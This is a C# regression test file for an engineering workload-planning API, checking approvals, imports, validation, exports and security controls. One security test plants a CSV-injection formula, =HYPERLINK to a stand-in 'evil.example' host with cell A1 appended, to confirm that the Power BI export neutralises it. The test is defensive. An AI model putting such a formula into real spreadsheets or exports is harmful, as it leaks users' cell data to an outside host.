using System.IO.Compression;
using System.Net;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using ClosedXML.Excel;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Mvc.Testing;

namespace Enppi.Workload.Tests;

/// <summary>Regression tests for the findings of the independent review: each test replays the reported reproduction.</summary>
public class ReviewFindingsTests : IClassFixture<AppFactory>
{
    private const string Cp = "cp.lead@enppi.demo", Elec = "gm.electrical@enppi.demo", Process = "gm.process@enppi.demo",
        Planner1 = "planner.one@enppi.demo", Admin = "admin@enppi.demo";
    private const string Why = "Client added a second substation; cable schedules and relay settings need more design hours";
    private static readonly int ImportColumns = Enppi.Workload.Api.Services.ImportService.ForecastColumns.Length;
    private readonly AppFactory _app;

    public ReviewFindingsTests(AppFactory app) => _app = app;

    private static async Task<JsonNode> Json(HttpResponseMessage r)
    {
        var text = await r.Content.ReadAsStringAsync();
        Assert.True(r.IsSuccessStatusCode, $"{(int)r.StatusCode} {text}");
        return JsonNode.Parse(text)!;
    }

    private static async Task<string> Refused(HttpResponseMessage r, HttpStatusCode code = HttpStatusCode.BadRequest)
    {
        var text = await r.Content.ReadAsStringAsync();
        Assert.True(r.StatusCode == code, $"expected {(int)code}, got {(int)r.StatusCode} {text}");
        return text;
    }

    private static object Values(params (int m, double? v)[] values) => values.Select(x => new { monthIndex = x.m, value = x.v }).ToList();

    private static MultipartFormDataContent Csv(string text, string name = "file.csv") =>
        new() { { new ByteArrayContent(Encoding.UTF8.GetBytes(text)), "file", name } };

    /// <summary>A 12-month cycle from Jan-27 in discipline review: 2500 Running 9100100 (100 x 4), 2500 Loan To 9100200-1,
    /// 1100 Proposal 9100500, 2500 Running 9100300 (1000 x 4).</summary>
    private async Task<int> CycleAsync(string name, string status = "DisciplineReview")
    {
        var cp = _app.As(Cp);
        int id = (await Json(await cp.PostAsJsonAsync("/api/cycles", new { name, firstMonth = "2027-01-01", monthCount = 12 })))["id"]!.GetValue<int>();
        const string head = "Dept,SubDept,Category,ProjectCode,Activity,Planner,Reason,Jan-27,Feb-27,Mar-27,Apr-27\n";
        var planning = head + "2500,2500,Running,9100100,Gas plant,planner.one@enppi.demo,,100,100,100,100\n" +
                       "2500,2500,Loan To,9100200-1,Site support,planner.one@enppi.demo,,50,50,,\n" +
                       "1100,1100,Proposal,9100500,Fertilizer FEED,planner.one@enppi.demo,,0,200,200,\n" +
                       "2500,2500,Running,9100300,Offshore tie-in,planner.one@enppi.demo,,1000,1000,1000,1000\n";
        await Json(await cp.PostAsync($"/api/cycles/{id}/import/planning", Csv(planning)));
        if (status != "Draft") await Json(await cp.PostAsJsonAsync($"/api/cycles/{id}/status", new { status }));
        return id;
    }

    private async Task<JsonObject> LineAsync(int cycle, string dept, string project) =>
        (await Json(await _app.As(Cp).GetAsync($"/api/cycles/{cycle}/lines?dept={dept}"))).AsArray()
        .First(l => (string)l!["project"]! == project)!.AsObject();

    private async Task<JsonNode> KpisAsync(int cycle, string user = Cp) =>
        (await Json(await _app.As(user).GetAsync($"/api/cycles/{cycle}/dashboard")))["kpis"]!;

    private async Task<int> QueueIdAsync(int cycle, string project, string kind = "Change") =>
        (await Json(await _app.As(Cp).GetAsync($"/api/cycles/{cycle}/queue"))).AsArray()
        .First(q => (string)q!["project"]! == project && (string)q["proposal"]!["kind"]! == kind)!["proposal"]!["id"]!.GetValue<int>();

    private Task<HttpResponseMessage> DecideAsync(int pid, string action, object? approvedValues = null) =>
        _app.As(Cp).PostAsJsonAsync($"/api/proposals/{pid}/decision", new { action, comment = $"{action} by test", approvedValues });

    private static double?[] Approved(JsonObject line) => line["approved"]!.AsArray().Select(v => v?.GetValue<double?>()).ToArray();

    private async Task<List<string[]>> FactAsync(int cycle, string file)
    {
        var bytes = await (await _app.As(Cp).GetAsync($"/api/cycles/{cycle}/export/powerbi")).Content.ReadAsByteArrayAsync();
        using var zip = new ZipArchive(new MemoryStream(bytes));
        using var reader = new StreamReader(zip.Entries.First(e => e.Name == file).Open(), Encoding.UTF8);
        return reader.ReadToEnd().Split("\r\n", StringSplitOptions.RemoveEmptyEntries).Select(l => l.Split(',')).ToList();
    }

    // ---------------------------------------------------------------- approvals (WF-1/WA-2, WF-2/WA-1, WA-3, WA-9)
    [Fact]
    public async Task Rejecting_a_category_change_restores_the_category_and_keeps_the_mh_approval()
    {
        int id = await CycleAsync("F category revert");
        int gas = (await LineAsync(id, "2500", "9100100"))["id"]!.GetValue<int>();
        var elec = _app.As(Elec);
        await Json(await elec.PostAsJsonAsync($"/api/cycles/{id}/proposals", new { lineId = gas, deptCode = "2500", kind = "Change", reason = Why, values = Values((1, 150)) }));
        await Json(await elec.PostAsJsonAsync($"/api/cycles/{id}/proposals",
            new { lineId = gas, deptCode = "2500", kind = "CategoryChange", requestedCategory = "UnderSignature", reason = "Contract not signed yet", values = Values() }));
        await Json(await elec.PostAsync($"/api/cycles/{id}/review/2500/submit", null));

        // both requests are in the queue and pending (one per request, not one per line)
        Assert.Equal(2, (await KpisAsync(id))["pendingDecisions"]!.GetValue<int>());
        int change = await QueueIdAsync(id, "9100100"), move = await QueueIdAsync(id, "9100100", "CategoryChange");
        await Json(await DecideAsync(change, "approve"));
        await Json(await DecideAsync(move, "approve"));
        var line = await LineAsync(id, "2500", "9100100");
        Assert.Equal("UnderSignature", (string?)line["approvedCategory"]);
        Assert.Equal("Running", (string)line["category"]!);   // Planning Input keeps the planner's category
        Assert.Equal(150, Approved(line)[1]);

        // Planning Input and the discipline scenario stay Running (the engine pairs a move with its baseline row); the approved
        // values (after implementation until an extract is loaded) move to the approved category
        var fact = await FactAsync(id, "FactWorkload.csv");
        Assert.All(fact.Where(r => r[4] == "9100100" && r[1] is "Planning Input" or "Discipline Comment"), r => Assert.Equal("Running", r[3]));
        Assert.All(fact.Where(r => r[4] == "9100100" && r[1] == "After Implementation"), r => Assert.Equal("Under Signature", r[3]));
        var items = await FactAsync(id, "FactCommentItems.csv");
        Assert.Contains("Phase Transfer", string.Join(",", items.First(r => r[6] == "9100100")));

        await Json(await DecideAsync(move, "reject"));
        line = await LineAsync(id, "2500", "9100100");
        Assert.Null((string?)line["approvedCategory"]);
        Assert.Equal(150, Approved(line)[1]);   // the separately approved man-hour change stands
        var queue = (await Json(await _app.As(Cp).GetAsync($"/api/cycles/{id}/queue"))).AsArray();
        Assert.Equal("Approved", (string)queue.First(q => q!["proposal"]!["id"]!.GetValue<int>() == change)!["proposal"]!["status"]!);
    }

    [Fact]
    public async Task Deciding_again_replaces_the_earlier_decision_month_by_month()
    {
        int id = await CycleAsync("F redecide");
        int gas = (await LineAsync(id, "2500", "9100100"))["id"]!.GetValue<int>();
        var elec = _app.As(Elec);
        await Json(await elec.PostAsJsonAsync($"/api/cycles/{id}/proposals", new { lineId = gas, deptCode = "2500", kind = "Change", reason = Why, values = Values((0, 150), (1, 150)) }));
        await Json(await elec.PostAsync($"/api/cycles/{id}/review/2500/submit", null));
        double planning = (await KpisAsync(id))["planning"]!.GetValue<double>();
        int pid = await QueueIdAsync(id, "9100100");

        // partial: Jan 120, Mar 50 (a month the department did not ask for)
        await Json(await DecideAsync(pid, "partial", Values((0, 120), (2, 50))));
        Assert.Equal(new double?[] { 120, 150, 50, null }, Approved(await LineAsync(id, "2500", "9100100")).Take(4));
        // full approval afterwards: March is no longer approved
        await Json(await DecideAsync(pid, "approve"));
        Assert.Equal(new double?[] { 150, 150, null, null }, Approved(await LineAsync(id, "2500", "9100100")).Take(4));
        Assert.Equal(planning + 100, (await KpisAsync(id))["final"]!.GetValue<double>(), 3);
        // a partial approval that blanks January keeps the planner value there
        var dec = await Json(await DecideAsync(pid, "partial", Values((0, null))));
        Assert.Equal("PartiallyApproved", (string)dec["status"]!);
        Assert.Null(Approved(await LineAsync(id, "2500", "9100100"))[0]);
        Assert.Equal(planning + 50, (await KpisAsync(id))["final"]!.GetValue<double>(), 3);
        // a rejected request can be returned to the department (WF-8)
        await Json(await DecideAsync(pid, "reject"));
        Assert.Equal(planning, (await KpisAsync(id))["final"]!.GetValue<double>(), 3);
        Assert.Equal("Returned", (string)(await Json(await DecideAsync(pid, "return")))["status"]!);
    }

    [Fact]
    public async Task Corporate_planning_returns_a_decided_request_before_it_changes()
    {
        int id = await CycleAsync("F decided edit");
        int gas = (await LineAsync(id, "2500", "9100100"))["id"]!.GetValue<int>();
        await Json(await _app.As(Elec).PostAsJsonAsync($"/api/cycles/{id}/proposals", new { lineId = gas, deptCode = "2500", kind = "Change", reason = Why, values = Values((0, 150)) }));
        await Json(await _app.As(Elec).PostAsync($"/api/cycles/{id}/review/2500/submit", null));
        int pid = await QueueIdAsync(id, "9100100");
        await Json(await DecideAsync(pid, "approve"));
        var edit = await _app.As(Cp).PostAsJsonAsync($"/api/cycles/{id}/proposals", new { lineId = gas, deptCode = "2500", kind = "Change", reason = Why, values = Values((0, 100)) });
        Assert.Contains("decided", await Refused(edit));
        Assert.Equal(150, Approved(await LineAsync(id, "2500", "9100100"))[0]);

        // a pending request saved back to the planner values is withdrawn, and the response says so
        await Json(await DecideAsync(pid, "return"));
        int off = (await LineAsync(id, "2500", "9100300"))["id"]!.GetValue<int>();
        var cp = _app.As(Cp);
        await Json(await cp.PostAsJsonAsync($"/api/cycles/{id}/proposals", new { lineId = off, deptCode = "2500", kind = "Change", reason = Why, values = Values((0, 1100)) }));
        var removed = await Json(await cp.PostAsJsonAsync($"/api/cycles/{id}/proposals", new { lineId = off, deptCode = "2500", kind = "Change", reason = Why, values = Values((0, 1000)) }));
        Assert.True(removed["removed"]!.GetValue<bool>());
    }

    // ---------------------------------------------------------------- imports (WF-3/WA-4, WA-5, WA-14, DATA-1, WA-11)
    [Fact]
    public async Task Importing_the_same_feedback_twice_does_not_double_count_or_undo_decisions()
    {
        int id = await CycleAsync("F reimport");
        var cp = _app.As(Cp);
        const string feedback = "Dept,SubDept,Category,ProjectCode,Activity,Planner,Reason,Jan-27,Feb-27,Mar-27,Apr-27\n" +
                                "2500,2500,Running,9100100,Gas plant,,More cable routing,150,,,\n" +
                                "2500,2500,Proposal,9100900,Desalination,,Load list for the bid,300,300,,\n";
        await Json(await cp.PostAsync($"/api/cycles/{id}/import/proposals", Csv(feedback)));
        var before = await KpisAsync(id);
        Assert.Equal(1, before["newAllocations"]!.GetValue<int>());
        int change = await QueueIdAsync(id, "9100100"), request = await QueueIdAsync(id, "9100900", "NewAllocation");
        await Json(await DecideAsync(change, "approve"));
        await Json(await DecideAsync(request, "approve"));
        double final = (await KpisAsync(id))["final"]!.GetValue<double>();

        var again = await Json(await cp.PostAsync($"/api/cycles/{id}/import/proposals", Csv(feedback)));
        Assert.Equal(0, again["created"]!.GetValue<int>());
        Assert.Contains(again["warnings"]!.AsArray(), w => ((string)w!).Contains("already decided"));
        var after = await KpisAsync(id);
        Assert.Equal(before["discipline"]!.GetValue<double>(), after["discipline"]!.GetValue<double>(), 3);
        Assert.Equal(1, after["newAllocations"]!.GetValue<int>());
        Assert.Equal(final, after["final"]!.GetValue<double>(), 3);
        Assert.Equal(0, after["pendingDecisions"]!.GetValue<int>());
    }

    [Fact]
    public async Task After_extract_rows_for_pending_new_allocations_join_the_request()
    {
        int id = await CycleAsync("F after request");
        var elec = _app.As(Elec);
        await Json(await elec.PostAsJsonAsync($"/api/cycles/{id}/proposals",
            new { deptCode = "2500", kind = "NewAllocation", newProjectCode = "9100900", newActivity = "Desalination", newCategory = "Proposal",
                  reason = "Proposal team needs the electrical load list and single-line diagram for the bid", values = Values((2, 300), (3, 300)) }));
        await Json(await elec.PostAsync($"/api/cycles/{id}/review/2500/submit", null));
        var cp = _app.As(Cp);
        const string after = "Dept,SubDept,Category,ProjectCode,Activity,Planner,Reason,Jan-27,Feb-27,Mar-27,Apr-27\n" +
                             "2500,2500,Running,9100100,Gas plant,,,100,100,100,100\n" +
                             "2500,2500,Running,9100300,Offshore tie-in,,,1000,1000,1000,1000\n" +
                             "2500,2500,Proposal,9100900,Desalination,,,,,300,300\n";
        var res = await Json(await cp.PostAsync($"/api/cycles/{id}/import/after", Csv(after)));
        Assert.Equal(0, res["created"]!.GetValue<int>());   // no separate after-only line for the request
        int request = await QueueIdAsync(id, "9100900", "NewAllocation");
        await Json(await DecideAsync(request, "approve"));
        var lines = (await Json(await cp.GetAsync($"/api/cycles/{id}/lines?dept=2500"))).AsArray();
        Assert.Single(lines, l => (string)l!["project"]! == "9100900");
        var impl = (await Json(await cp.GetAsync($"/api/cycles/{id}/implementation"))).AsArray();
        Assert.Equal("Implemented", (string)impl.First(x => (string)x!["project"]! == "9100900")!["status"]!);
        Assert.Equal(1, (await KpisAsync(id))["implementationRate"]!.GetValue<double>(), 3);
    }

    [Fact]
    public async Task Reviewed_departments_sheet_records_no_change_answers()
    {
        int id = await CycleAsync("F reviewed");
        using var wb = new XLWorkbook();
        var ws = wb.AddWorksheet("Forecast");
        string[] head = { "Dept", "SubDept", "Category", "ProjectCode", "Activity", "Planner", "Reason", "Occurrence", "RequestedCategory" };
        for (int i = 0; i < head.Length; i++) ws.Cell(1, i + 1).Value = head[i];
        ws.Cell(1, ImportColumns + 1).Value = new DateTime(2027, 1, 1);
        ws.Cell(2, 1).Value = "2500"; ws.Cell(2, 2).Value = "2500"; ws.Cell(2, 3).Value = "Running"; ws.Cell(2, 4).Value = "9100100";
        ws.Cell(2, ImportColumns + 1).Value = 140;
        var list = wb.AddWorksheet("Reviewed departments");
        list.Cell(1, 1).Value = "Dept"; list.Cell(2, 1).Value = "2500"; list.Cell(3, 1).Value = "1100";
        using var ms = new MemoryStream();
        wb.SaveAs(ms);
        var form = new MultipartFormDataContent { { new ByteArrayContent(ms.ToArray()), "file", "proposals.xlsx" } };
        await Json(await _app.As(Cp).PostAsync($"/api/cycles/{id}/import/proposals", form));
        var board = (await Json(await _app.As(Cp).GetAsync($"/api/cycles/{id}/status-board"))).AsArray();
        Assert.Equal("Submitted", (string)board.First(b => (string)b!["dept"]! == "2500")!["status"]!);
        Assert.Equal("NoChangeConfirmed", (string)board.First(b => (string)b!["dept"]! == "1100")!["status"]!);
    }

    [Fact]
    public async Task Reference_imports_keep_what_the_file_does_not_mention()
    {
        var admin = _app.As(Admin);
        await Json(await admin.PostAsync("/api/admin/import/departments", Csv("Code,Name,Permanent,Temporary\n2410,Piping Technical,30,5\n")));
        var d = (await Json(await admin.GetAsync("/api/departments"))).AsArray().First(x => (string)x!["code"]! == "2410")!;
        Assert.Equal("2400", (string?)d["parentCode"]);
        Assert.Equal(30, d["permanent"]!.GetValue<int>());

        // a phase of a master project counts as in the master and takes its name
        int id = await CycleAsync("F base code", "Draft");
        var res = await Json(await _app.As(Cp).PostAsync($"/api/cycles/{id}/import/planning",
            Csv("Dept,SubDept,Category,ProjectCode,Activity,Planner,Reason,Jan-27\n2500,2500,Running,9100100-5,Phase 5,,,10\n")));
        Assert.DoesNotContain(res["warnings"]!.AsArray(), w => ((string)w!).Contains("9100100-5"));
        var p = (await Json(await _app.As(Cp).GetAsync("/api/projects?q=9100100-5"))).AsArray().Single()!;
        Assert.True(p["inMaster"]!.GetValue<bool>());
    }

    // ---------------------------------------------------------------- new allocations (WF-6, WA-6, WA-8)
    [Fact]
    public async Task New_allocation_requests_keep_the_project_master_clean_and_stay_editable()
    {
        int id = await CycleAsync("F new allocation");
        var elec = _app.As(Elec);
        var saved = await Json(await elec.PostAsJsonAsync($"/api/cycles/{id}/proposals",
            new { deptCode = "2500", kind = "NewAllocation", newProjectCode = "FAKE-001", newActivity = "Unknown work", newCategory = "Proposal",
                  reason = Why, values = Values((0, 100)) }));
        Assert.Empty((await Json(await elec.GetAsync("/api/projects?q=FAKE-001"))).AsArray());
        Assert.Equal(HttpStatusCode.NoContent, (await elec.DeleteAsync($"/api/cycles/{id}/proposals/{saved["id"]}")).StatusCode);
        Assert.Empty((await Json(await elec.GetAsync("/api/projects?q=FAKE-001"))).AsArray());

        // another phase of a project the department already has is a new phase; an unknown code is a new project
        await Json(await elec.PostAsJsonAsync($"/api/cycles/{id}/proposals",
            new { deptCode = "2500", kind = "NewAllocation", newProjectCode = "9100100-2", newActivity = "Gas plant phase 2", newCategory = "Running",
                  reason = Why, values = Values((5, 200)) }));
        var phase = await Json(await elec.PostAsJsonAsync($"/api/cycles/{id}/proposals",
            new { deptCode = "2500", kind = "NewAllocation", newProjectCode = "9100950", newActivity = "Tank farm", newCategory = "Proposal",
                  reason = Why, values = Values((5, 200)) }));
        Assert.Equal("New Project", (string)phase["changeTypes"]!);
        await Json(await elec.PostAsync($"/api/cycles/{id}/review/2500/submit", null));
        var items = (await Json(await _app.As(Cp).GetAsync($"/api/cycles/{id}/reports/deviations"))).AsArray();
        Assert.Contains("New Phase Allocation", (string)items.First(x => (string)x!["project"]! == "9100100-2")!["types"]!);

        // approved, then returned: the request is back on the department's review screen and can be corrected
        int request = await QueueIdAsync(id, "9100950", "NewAllocation");
        await Json(await DecideAsync(request, "approve"));
        Assert.Single((await Json(await elec.GetAsync("/api/projects?q=9100950"))).AsArray());
        await Json(await DecideAsync(request, "return"));
        var review = await Json(await elec.GetAsync($"/api/cycles/{id}/review/2500"));
        Assert.Equal("Returned", (string)review["newAllocations"]!.AsArray().First(x => x!["id"]!.GetValue<int>() == request)!["status"]!);
        Assert.Equal(HttpStatusCode.OK, (await elec.PostAsJsonAsync($"/api/cycles/{id}/proposals",
            new { proposalId = request, deptCode = "2500", kind = "NewAllocation", newProjectCode = "9100950", newActivity = "Tank farm",
                  newCategory = "Proposal", reason = Why, values = Values((5, 150)) })).StatusCode);
    }

    // ---------------------------------------------------------------- validation (WF-5, VAL-1, VAL-2)
    [Fact]
    public async Task Malformed_values_are_refused_with_a_reason_not_a_server_error()
    {
        int id = await CycleAsync("F validation");
        int gas = (await LineAsync(id, "2500", "9100100"))["id"]!.GetValue<int>();
        var elec = _app.As(Elec);
        async Task Bad(object body) => await Refused(await elec.PostAsJsonAsync($"/api/cycles/{id}/proposals", body));
        await Bad(new { lineId = gas, deptCode = "2500", kind = 3, reason = Why, values = Values((0, 1)) });
        await Bad(new { lineId = gas, deptCode = "2500", kind = "CategoryChange", requestedCategory = 9, reason = Why, values = Values() });
        await Bad(new { lineId = gas, deptCode = "2500", kind = "Change", reason = new string('A', 3000), values = Values((0, 150)) });
        await Bad(new { lineId = gas, deptCode = "2500", kind = "Change", reason = Why, values = Values((0, 1e308)) });
        await Bad(new { lineId = gas, deptCode = "2500", kind = "Change", reason = Why, values = Values((0, 150), (0, 160)) });
        await Bad(new { lineId = gas, deptCode = "2500", kind = "Change", reason = Why, values = Values((12, 150)) });
        var nan = new StringContent($"{{\"lineId\":{gas},\"deptCode\":\"2500\",\"kind\":\"Change\",\"reason\":\"x\",\"values\":[{{\"monthIndex\":0,\"value\":\"NaN\"}}]}}",
                                    Encoding.UTF8, "application/json");
        await Refused(await elec.PostAsync($"/api/cycles/{id}/proposals", nan));
        // a planning import with a negative or non-numeric cell leaves it blank with a warning
        var res = await Json(await _app.As(Cp).PostAsync($"/api/cycles/{id}/import/planning",
            Csv("Dept,SubDept,Category,ProjectCode,Activity,Planner,Reason,Jan-27,Feb-27\n2500,2500,Running,9100100,Gas plant,,,-300,NaN\n")));
        Assert.Equal(2, res["warnings"]!.AsArray().Count(w => ((string)w!).Contains("left blank")));
    }

    // ---------------------------------------------------------------- security (SEC-1..7)
    [Fact]
    public async Task Accounts_without_a_role_can_sign_in_but_see_nothing()
    {
        await using var easy = _app.WithWebHostBuilder(b => b.UseSetting("Auth:Mode", "EasyAuth"));
        HttpClient Client(params (string typ, string val)[] claims)
        {
            var c = easy.CreateClient();
            var principal = new { auth_typ = "aad", claims = claims.Select(x => new { x.typ, x.val }).ToArray() };
            c.DefaultRequestHeaders.Add("X-MS-CLIENT-PRINCIPAL", Convert.ToBase64String(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(principal))));
            return c;
        }
        var stranger = Client(("preferred_username", "random.employee@enppi.com"));
        var me = await Json(await stranger.GetAsync("/api/me"));
        Assert.Empty(me["roles"]!.AsArray());
        Assert.Equal(HttpStatusCode.Forbidden, (await stranger.GetAsync("/api/cycles")).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden, (await stranger.GetAsync("/api/cycles/1/export/powerbi")).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden, (await stranger.GetAsync("/api/cycles/1/lines")).StatusCode);

        // the sign-in name wins over an e-mail claim that happens to come first
        var mixed = Client(("email", "cp.lead@enppi.demo"), ("preferred_username", "someone.else@enppi.demo"));
        Assert.Equal("someone.else@enppi.demo", (string)(await Json(await mixed.GetAsync("/api/me")))["upn"]!);

        // development sign-in accepts only known users
        var unknown = _app.CreateClient();
        unknown.DefaultRequestHeaders.Add("X-Dev-User", "nobody@evil.example");
        Assert.Equal(HttpStatusCode.Unauthorized, (await unknown.GetAsync("/api/cycles")).StatusCode);
    }

    [Fact]
    public async Task Discipline_managers_reports_cover_their_own_departments()
    {
        int id = await CycleAsync("F scope");
        var process = _app.As(Process);
        var depts = (await Json(await process.GetAsync($"/api/cycles/{id}/reports/departments"))).AsArray();
        Assert.All(depts, d => Assert.Equal("1100", (string)d!["deptCode"]!));
        var projects = (await Json(await process.GetAsync($"/api/cycles/{id}/reports/projects"))).AsArray();
        Assert.All(projects, p => Assert.Equal("9100500", (string)p!["projectCode"]!));
        Assert.Equal(400, (await KpisAsync(id, Process))["planning"]!.GetValue<double>(), 3);
    }

    [Fact]
    public async Task State_changes_need_the_screens_marker_and_responses_carry_browser_protections()
    {
        int id = await CycleAsync("F csrf");
        var raw = _app.CreateClient();
        raw.DefaultRequestHeaders.Add("X-Dev-User", Cp);
        var form = new FormUrlEncodedContent(new Dictionary<string, string> { ["a"] = "b" });
        Assert.Contains("X-Requested-With", await Refused(await raw.PostAsync($"/api/cycles/{id}/bulk-approve", form)));
        var page = await raw.GetAsync("/");
        Assert.Equal("DENY", page.Headers.GetValues("X-Frame-Options").Single());
        Assert.Equal("nosniff", page.Headers.GetValues("X-Content-Type-Options").Single());
        Assert.Contains("frame-ancestors 'none'", page.Headers.GetValues("Content-Security-Policy").Single());
        // an unknown API path is a 404, not the single-page app's HTML
        Assert.Equal(HttpStatusCode.NotFound, (await raw.GetAsync("/api/no-such-thing")).StatusCode);
    }

    [Fact]
    public async Task Exported_text_is_never_read_as_a_formula()
    {
        int id = await CycleAsync("F csv injection");
        int gas = (await LineAsync(id, "2500", "9100100"))["id"]!.GetValue<int>();
        const string evil = "=HYPERLINK(\"http://evil.example/?x=\"&A1,\"Click for details\") and more text to pass the justification check";
        await Json(await _app.As(Elec).PostAsJsonAsync($"/api/cycles/{id}/proposals", new { lineId = gas, deptCode = "2500", kind = "Change", reason = evil, values = Values((0, 150)) }));
        await Json(await _app.As(Elec).PostAsync($"/api/cycles/{id}/review/2500/submit", null));
        var bytes = await (await _app.As(Cp).GetAsync($"/api/cycles/{id}/export/powerbi")).Content.ReadAsByteArrayAsync();
        using var zip = new ZipArchive(new MemoryStream(bytes));
        var text = new StreamReader(zip.Entries.First(e => e.Name == "FactCommentItems.csv").Open(), Encoding.UTF8).ReadToEnd();
        Assert.Contains("\"'=HYPERLINK(", text);
        Assert.DoesNotContain(",\"=HYPERLINK(", text);
    }

    [Fact]
    public void Pick_a_user_sign_in_refuses_to_start_outside_development()
    {
        using var prod = _app.WithWebHostBuilder(b => { b.UseEnvironment("Production"); b.UseSetting("Auth:Mode", "Development"); });
        var ex = Assert.ThrowsAny<Exception>(() => prod.CreateClient());
        Assert.Contains("Development", ex.ToString());
    }

    // ---------------------------------------------------------------- cycle control (WF-7, WF-9, WA-10)
    [Fact]
    public async Task A_locked_cycle_keeps_its_capacity_and_sends_no_reminders()
    {
        int id = await CycleAsync("F lock capacity");
        var cp = _app.As(Cp);
        double Cap(JsonArray depts) => depts.First(d => (string)d!["deptCode"]! == "2500")!["capacityPerMonth"]!.GetValue<double>();
        await Json(await cp.PostAsJsonAsync($"/api/cycles/{id}/status", new { status = "Locked" }));
        double before = Cap((await Json(await cp.GetAsync($"/api/cycles/{id}/reports/departments"))).AsArray());
        var dept = (await Json(await cp.GetAsync("/api/departments"))).AsArray().First(d => (string)d!["code"]! == "2500")!;
        var admin = _app.As(Admin);
        await Json(await admin.PutAsJsonAsync("/api/admin/departments/2500", new { name = (string)dept["name"]!, parentCode = (string?)null, permanent = 1,
            temporary = 0, managers = 1, loanToUnpaid = 0 }));
        try
        {
            Assert.Equal(before, Cap((await Json(await cp.GetAsync($"/api/cycles/{id}/reports/departments"))).AsArray()));
            Assert.Contains("discipline review", await Refused(await cp.PostAsync($"/api/cycles/{id}/reminders", null)));
        }
        finally
        {
            await Json(await admin.PutAsJsonAsync("/api/admin/departments/2500", new { name = (string)dept["name"]!, parentCode = (string?)null,
                permanent = dept["permanent"]!.GetValue<int>(), temporary = dept["temporary"]!.GetValue<int>(), managers = dept["managers"]!.GetValue<int>(),
                loanToUnpaid = dept["loanToUnpaid"]!.GetValue<int>() }));
        }
    }

    [Fact]
    public async Task Kpi_tiles_add_up_to_the_monthly_chart_with_unknown_departments()
    {
        int id = await CycleAsync("F unknown dept");
        await Json(await _app.As(Cp).PostAsync($"/api/cycles/{id}/import/planning",
            Csv("Dept,SubDept,Category,ProjectCode,Activity,Planner,Reason,Jan-27,Feb-27\n9999,9999,Running,9100100,Gas plant,,,1000,1000\n")));
        var dash = await Json(await _app.As(Cp).GetAsync($"/api/cycles/{id}/dashboard"));
        double monthly = dash["monthly"]!.AsArray().Sum(m => m!["planning"]!.GetValue<double>());
        Assert.Equal(monthly, dash["kpis"]!["planning"]!.GetValue<double>(), 3);
        Assert.Contains(dash["departments"]!.AsArray(), d => (string)d!["deptCode"]! == "9999");
    }
}
